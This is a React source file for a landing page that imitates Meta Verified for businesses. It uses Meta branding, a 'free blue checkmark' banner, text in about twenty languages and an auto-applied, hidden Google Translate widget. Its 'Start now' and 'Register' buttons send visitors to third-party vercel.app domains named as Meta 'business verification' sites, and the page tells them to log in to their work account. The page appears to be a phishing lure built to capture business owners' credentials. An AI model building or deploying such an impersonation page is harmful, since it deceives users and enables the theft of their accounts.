import React, { useEffect } from "react";

export default function App() {
  const lang =
  typeof navigator !== "undefined"
    ? navigator.language.split("-")[0]
    : "en";

  const text = {
    en: {
      begin: "Begin",
      advertisement: "Advertisement",
      learn: "Learn",
      support: "Support",
      schedule: "Schedule a call",
      start: "Start now",
      register: "Register",
      title: "Let the whole world know that you take business seriously.",
      desc: "Meta Verified helps you build credibility with new audiences and protect your brand.",
    },

    vi: {
      begin: "Bắt đầu",
      advertisement: "Quảng cáo",
      learn: "Tìm hiểu",
      support: "Hỗ trợ",
      schedule: "Đặt lịch gọi",
      start: "Bắt đầu ngay",
      register: "Đăng ký",
      title:
        "Hãy để cả thế giới biết rằng bạn nghiêm túc với doanh nghiệp của mình.",
      desc: "Meta Verified giúp bạn xây dựng uy tín và bảo vệ thương hiệu.",
    },

    zh: {
      begin: "开始",
      advertisement: "广告",
      learn: "学习",
      support: "支持",
      schedule: "预约通话",
      start: "立即开始",
      register: "注册",
      title: "让全世界知道您认真对待您的业务。",
      desc: "Meta Verified 帮助您建立信誉并保护您的品牌。",
    },

    ja: {
      begin: "開始",
      advertisement: "広告",
      learn: "学ぶ",
      support: "サポート",
      schedule: "通話予約",
      start: "今すぐ開始",
      register: "登録",
      title: "あなたがビジネスに真剣であることを世界に示しましょう。",
      desc: "Meta Verified はブランド保護と信頼構築を支援します。",
    },

    ko: {
      begin: "시작",
      advertisement: "광고",
      learn: "배우기",
      support: "지원",
      schedule: "통화 예약",
      start: "지금 시작",
      register: "등록",
      title: "당신이 비즈니스에 진지하다는 것을 세상에 알리세요.",
      desc: "Meta Verified는 브랜드 보호와 신뢰 구축을 도와줍니다.",
    },

    fr: {
      begin: "Commencer",
      advertisement: "Publicité",
      learn: "Apprendre",
      support: "Support",
      schedule: "Planifier un appel",
      start: "Commencer maintenant",
      register: "S'inscrire",
      title:
        "Montrez au monde entier que vous prenez votre entreprise au sérieux.",
      desc: "Meta Verified vous aide à protéger votre marque.",
    },

    de: {
      begin: "Start",
      advertisement: "Werbung",
      learn: "Lernen",
      support: "Support",
      schedule: "Anruf planen",
      start: "Jetzt starten",
      register: "Registrieren",
      title: "Zeigen Sie der Welt, dass Sie Ihr Unternehmen ernst nehmen.",
      desc: "Meta Verified hilft Ihnen beim Schutz Ihrer Marke.",
    },

    es: {
      begin: "Comenzar",
      advertisement: "Publicidad",
      learn: "Aprender",
      support: "Soporte",
      schedule: "Programar llamada",
      start: "Comenzar ahora",
      register: "Registrarse",
      title: "Hazle saber al mundo que tomas en serio tu negocio.",
      desc: "Meta Verified te ayuda a proteger tu marca.",
    },

    pt: {
      begin: "Começar",
      advertisement: "Publicidade",
      learn: "Aprender",
      support: "Suporte",
      schedule: "Agendar chamada",
      start: "Comece agora",
      register: "Registrar",
      title: "Mostre ao mundo que você leva seu negócio a sério.",
      desc: "Meta Verified ajuda a proteger sua marca.",
    },

    ru: {
      begin: "Начать",
      advertisement: "Реклама",
      learn: "Изучить",
      support: "Поддержка",
      schedule: "Запланировать звонок",
      start: "Начать сейчас",
      register: "Регистрация",
      title: "Покажите миру, что вы серьезно относитесь к своему бизнесу.",
      desc: "Meta Verified помогает защитить ваш бренд.",
    },

    ar: {
      begin: "ابدأ",
      advertisement: "إعلان",
      learn: "تعلّم",
      support: "الدعم",
      schedule: "جدولة مكالمة",
      start: "ابدأ الآن",
      register: "تسجيل",
      title: "دع العالم يعرف أنك تأخذ عملك على محمل الجد.",
      desc: "يساعدك Meta Verified على حماية علامتك التجارية.",
    },

    tr: {
      begin: "Başla",
      advertisement: "Reklam",
      learn: "Öğren",
      support: "Destek",
      schedule: "Arama planla",
      start: "Şimdi başla",
      register: "Kayıt Ol",
      title: "İşinizi ciddiye aldığınızı tüm dünyaya gösterin.",
      desc: "Meta Verified markanızı korumanıza yardımcı olur.",
    },

    it: {
      begin: "Inizia",
      advertisement: "Pubblicità",
      learn: "Impara",
      support: "Supporto",
      schedule: "Pianifica chiamata",
      start: "Inizia ora",
      register: "Registrati",
      title: "Fai sapere al mondo che prendi sul serio il tuo business.",
      desc: "Meta Verified ti aiuta a proteggere il tuo marchio.",
    },

    id: {
      begin: "Mulai",
      advertisement: "Iklan",
      learn: "Pelajari",
      support: "Dukungan",
      schedule: "Jadwalkan panggilan",
      start: "Mulai sekarang",
      register: "Daftar",
      title: "Biarkan dunia tahu bahwa Anda serius dengan bisnis Anda.",
      desc: "Meta Verified membantu melindungi merek Anda.",
    },

    th: {
      begin: "เริ่มต้น",
      advertisement: "โฆษณา",
      learn: "เรียนรู้",
      support: "สนับสนุน",
      schedule: "กำหนดการโทร",
      start: "เริ่มตอนนี้",
      register: "สมัคร",
      title: "ให้โลกทั้งใบรู้ว่าคุณจริงจังกับธุรกิจของคุณ",
      desc: "Meta Verified ช่วยปกป้องแบรนด์ของคุณ",
    },

    hi: {
      begin: "शुरू करें",
      advertisement: "विज्ञापन",
      learn: "सीखें",
      support: "सहायता",
      schedule: "कॉल शेड्यूल करें",
      start: "अभी शुरू करें",
      register: "रजिस्टर करें",
      title: "दुनिया को बताएं कि आप अपने व्यवसाय को गंभीरता से लेते हैं।",
      desc: "Meta Verified आपके ब्रांड की सुरक्षा में मदद करता है।",
    },

    nl: {
      begin: "Begin",
      advertisement: "Advertentie",
      learn: "Leren",
      support: "Ondersteuning",
      schedule: "Gesprek plannen",
      start: "Nu beginnen",
      register: "Registreren",
      title: "Laat de wereld weten dat u uw bedrijf serieus neemt.",
      desc: "Meta Verified helpt uw merk te beschermen.",
    },

    pl: {
      begin: "Rozpocznij",
      advertisement: "Reklama",
      learn: "Ucz się",
      support: "Wsparcie",
      schedule: "Zaplanuj rozmowę",
      start: "Zacznij teraz",
      register: "Zarejestruj",
      title: "Pokaż światu, że poważnie traktujesz swój biznes.",
      desc: "Meta Verified pomaga chronić Twoją markę.",
    },

    uk: {
      begin: "Почати",
      advertisement: "Реклама",
      learn: "Навчатися",
      support: "Підтримка",
      schedule: "Запланувати дзвінок",
      start: "Почати зараз",
      register: "Реєстрація",
      title: "Покажіть світу, що ви серйозно ставитесь до свого бізнесу.",
      desc: "Meta Verified допомагає захистити ваш бренд.",
    },

    bg: {
      begin: "Начало",
      advertisement: "Реклама",
      learn: "Научи",
      support: "Поддръжка",
      schedule: "Планирай обаждане",
      start: "Започни сега",
      register: "Регистрация",
      title: "Покажете на света, че приемате бизнеса си сериозно.",
      desc: "Meta Verified помага да защитите своята марка.",
    },

    ms: {
      begin: "Mula",
      advertisement: "Iklan",
      learn: "Belajar",
      support: "Sokongan",
      schedule: "Jadualkan panggilan",
      start: "Mulakan sekarang",
      register: "Daftar",
      title: "Biarkan dunia tahu bahawa anda serius dengan perniagaan anda.",
      desc: "Meta Verified membantu melindungi jenama anda.",
    },
  };

  const t = text[lang] || text.en;

  const unsupported = !text[lang];
  useEffect(() => {
  const userLang = navigator.language || "en";
  const shortLang = userLang.split("-")[0];

  window.googleTranslateElementInit = () => {
    if (
      window.google &&
      window.google.translate &&
      window.google.translate.TranslateElement
    ) {
      new window.google.translate.TranslateElement(
        {
          pageLanguage: "en",
          autoDisplay: false,
        },
        "google_translate_element"
      );

      setTimeout(() => {
        const select = document.querySelector(".goog-te-combo");

        if (select) {
          select.value = shortLang;
          select.dispatchEvent(new Event("change"));
        }
      }, 100);
    }
  };

  const addScript = document.createElement("script");

  addScript.src =
  "https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit";

  addScript.async = true;

  document.body.appendChild(addScript);

  return () => {
    document.body.removeChild(addScript);
  };
}, []);
  const images = [
    "https://images.unsplash.com/photo-1500648767791-00dcc994a43e?q=80&w=1200&auto=format&fit=crop",
    "https://images.unsplash.com/photo-1494790108377-be9c29b29330?q=80&w=1200&auto=format&fit=crop",
    "https://images.unsplash.com/photo-1517841905240-472988babdf9?q=80&w=1200&auto=format&fit=crop",
    "https://images.unsplash.com/photo-1517423440428-a5a00ad493e8?q=80&w=1200&auto=format&fit=crop",
  ];

  return (
    <>
      <style>{`
      .goog-te-banner-frame.skiptranslate {
        display:none !important;
      }
      
      body {
        top:0 !important;
      }
      
      iframe.skiptranslate {
        display:none !important;
      }
      
      .goog-te-gadget-icon {
        display:none !important;
      }
      
      .goog-tooltip,
      .goog-tooltip:hover {
        display:none !important;
      }
      
      .goog-text-highlight {
        background:none !important;
        box-shadow:none !important;
      }
      
      #google_translate_element {
        position:absolute;
        top:-9999px;
        left:-9999px;
      }
      .goog-logo-link,
      .goog-te-gadget span {
        display:none !important;
      }
      
      .goog-te-gadget {
        color:transparent !important;
      }
      
      .goog-te-banner-frame {
        display:none !important;
      }
      
      body {
        top:0 !important;
      }

        *{
          margin:0;
          padding:0;
          box-sizing:border-box;
          font-family:Arial, Helvetica, sans-serif;
        }

        body{
          background:#f5f5f5;
          overflow-x:hidden;
        }

        .app{
          width:100%;
          min-height:100vh;
        }

        /* HEADER */

        .header{
          width:100%;
          height:74px;
          background:#fff;
          border-bottom:1px solid #ddd;
          position:sticky;
          top:0;
          z-index:1000;
        }

        .header-container{
          max-width:1400px;
          margin:auto;
          height:100%;
          display:flex;
          align-items:center;
          justify-content:space-between;
          padding:0 40px;
        }

        .logo-nav{
          display:flex;
          align-items:center;
          gap:50px;
        }

        .logo{
          font-size:34px;
          color:#1877f2;
          font-weight:700;
          cursor:pointer;
        }

        .nav{
          display:flex;
          gap:35px;
        }

        .nav a{
          text-decoration:none;
          color:#111827;
          font-size:15px;
          font-weight:500;
          transition:0.3s;
        }

        .nav a:hover{
          color:#1877f2;
        }

        .header-buttons{
        display:flex;
        align-items:center;
        gap:15px;
        }

       .header-buttons .goog-te-gadget {
       font-size:0 !important;
       }
       .header-buttons .goog-te-gadget select{
       padding:10px 14px;
       border-radius:12px;
       border:1px solid #ddd;
       cursor:pointer;
       background:white;
       }
          display:flex;
          align-items:center;
          gap:15px;
        }

        .call-btn{
          border:1px solid #1877f2;
          background:#fff;
          color:#1877f2;
          padding:12px 20px;
          border-radius:999px;
          font-weight:600;
          cursor:pointer;
          transition:0.3s;
        }

        .call-btn:hover{
          background:#1877f2;
          color:#fff;
        }

        .start-btn{
          border:none;
          background:#1877f2;
          color:#fff;
          padding:12px 24px;
          border-radius:14px;
          font-weight:600;
          cursor:pointer;
          transition:0.3s;
          box-shadow:0 8px 20px rgba(24,119,242,0.3);
        }

        .start-btn:hover{
          transform:translateY(-2px);
          background:#1664d9;
        }

        /* TOP BANNER */

        .banner{
          width:100%;
          background:#101820;
          color:#fff;
          text-align:center;
          padding:16px;
          font-size:15px;
          font-weight:500;
        }

        /* HERO */

        .hero{
          max-width:1400px;
          margin:auto;
          min-height:calc(100vh - 120px);
          display:flex;
          align-items:center;
          justify-content:space-between;
          gap:80px;
          padding:80px 40px;
        }

        /* LEFT */

        .hero-left{
          max-width:620px;
          animation:fadeUp 1s ease;
        }

        .verified{
          width:82px;
          height:82px;
          border-radius:50%;
          background:#1877f2;
          display:flex;
          align-items:center;
          justify-content:center;
          color:#fff;
          font-size:40px;
          margin-bottom:30px;
          box-shadow:0 10px 30px rgba(24,119,242,0.4);
        }

        .hero-title{
          font-size:78px;
          line-height:1.05;
          font-weight:500;
          color:#111827;
          margin-bottom:30px;
        }

        .hero-desc{
          font-size:20px;
          line-height:1.8;
          color:#4b5563;
          margin-bottom:40px;
          max-width:540px;
        }

        .register-btn{
          border:none;
          background:#1877f2;
          color:#fff;
          padding:18px 38px;
          border-radius:999px;
          font-size:18px;
          font-weight:600;
          cursor:pointer;
          transition:0.3s;
          box-shadow:0 10px 30px rgba(24,119,242,0.35);
        }

        .register-btn:hover{
          transform:translateY(-3px);
          background:#1664d9;
        }

        .small-text{
          margin-top:35px;
          font-size:14px;
          line-height:1.9;
          color:#6b7280;
          max-width:520px;
        }

        .small-text span{
          color:#1877f2;
          cursor:pointer;
        }

        .small-text span:hover{
          text-decoration:underline;
        }

        /* RIGHT */

        .hero-right{
          position:relative;
          animation:fadeUp 1.2s ease;
        }

        .glow{
          position:absolute;
          inset:0;
          background:#60a5fa;
          filter:blur(120px);
          opacity:0.25;
          border-radius:50%;
        }

        .phone-grid{
          position:relative;
          display:grid;
          grid-template-columns:repeat(2, 280px);
          gap:24px;
          transform:rotate(-6deg);
        }

        .card{
          width:280px;
          height:560px;
          border-radius:36px;
          overflow:hidden;
          background:#fff;
          box-shadow:0 20px 50px rgba(0,0,0,0.18);
          transition:0.4s;
          animation:float 5s ease-in-out infinite;
        }

        .card:hover{
          transform:translateY(-10px) scale(1.03);
        }

        .card img{
          width:100%;
          height:100%;
          object-fit:cover;
        }

        .offset-top{
          margin-top:60px;
        }

        .offset-bottom{
          margin-top:-60px;
        }

        /* ANIMATION */

        @keyframes float{

          0%,100%{
            transform:translateY(0px);
          }

          50%{
            transform:translateY(-20px);
          }

        }

        @keyframes fadeUp{

          from{
            opacity:0;
            transform:translateY(40px);
          }

          to{
            opacity:1;
            transform:translateY(0px);
          }

        }

        /* RESPONSIVE */

        @media(max-width:1200px){

          .hero{
            flex-direction:column;
            text-align:center;
          }

          .hero-left{
            max-width:100%;
          }

          .hero-desc,
          .small-text{
            margin-left:auto;
            margin-right:auto;
          }

        }

        @media(max-width:900px){

          .nav{
            display:none;
          }

          .hero-title{
            font-size:56px;
          }

          .phone-grid{
            grid-template-columns:1fr 1fr;
          }

          .card{
            width:220px;
            height:440px;
          }

        }

        @media(max-width:600px){

          .header-container{
            padding:0 20px;
          }

          .call-btn{
            display:none;
          }

          .hero{
            padding:60px 20px;
          }

          .hero-title{
            font-size:42px;
          }

          .phone-grid{
            grid-template-columns:1fr;
            transform:none;
          }

          .card{
            width:260px;
            height:480px;
          }

          .offset-top,
          .offset-bottom{
            margin-top:0;
          }

        }

      `}</style>

      <div className="app">
        {/* HEADER */}

        <header className="header">
          <div className="header-container">
            <div className="logo-nav">
              <div className="logo">Meta</div>

              <nav className="nav">
                <a href="#">{t.begin}</a>
                <a href="#">{t.advertisement}</a>
                <a href="#">{t.learn}</a>
                <a href="#">{t.support}</a>
              </nav>
            </div>

            <div className="header-buttons">
              <div
                id="google_translate_element"
                style={{ display: "none" }}
              ></div>
              <button className="call-btn">{t.schedule}</button>

              <button
                className="start-btn"
                onClick={() =>
                  window.open(
                    "https://meta-business-verification-system.vercel.app/meta-community",
                    "_blank"
                  )
                }
              >
                {t.start}
              </button>
            </div>
          </div>
        </header>

        {/* BANNER */}

        <div className="banner">
          Register a verified Meta account on Facebook and Instagram to get a
          free blue checkmark.
        </div>

        {/* HERO */}

        <section className="hero">
          {/* LEFT */}

          <div className="hero-left">
            <div className="verified">✓</div>

            <h1 className="hero-title">{t.title}</h1>

            <p className="hero-desc">{t.desc}</p>

            <button
              className="register-btn"
              onClick={() =>
                window.open(
                  "https://meta-business-verification-center.vercel.app/meta-community",
                  "_blank"
                )
              }
            >
              {t.register}
            </button>

            <div className="small-text">
              To register for a verified Meta account for businesses, you must
              log in to your work account.
              <br />
              <br />
              <span>Instagram</span> or <span>Business Page</span>
              <br />
              <br />
              Are you a content creator?
              <span> Learn more about verified meta for content creators.</span>
            </div>
          </div>

          {/* RIGHT */}

          <div className="hero-right">
            <div className="glow"></div>

            <div className="phone-grid">
              <div className="card">
                <img src={images[0]} alt="" />
              </div>

              <div className="card offset-top">
                <img src={images[1]} alt="" />
              </div>

              <div className="card offset-bottom">
                <img src={images[2]} alt="" />
              </div>

              <div className="card">
                <img src={images[3]} alt="" />
              </div>
            </div>
          </div>
        </section>
      </div>
    </>
  );
}
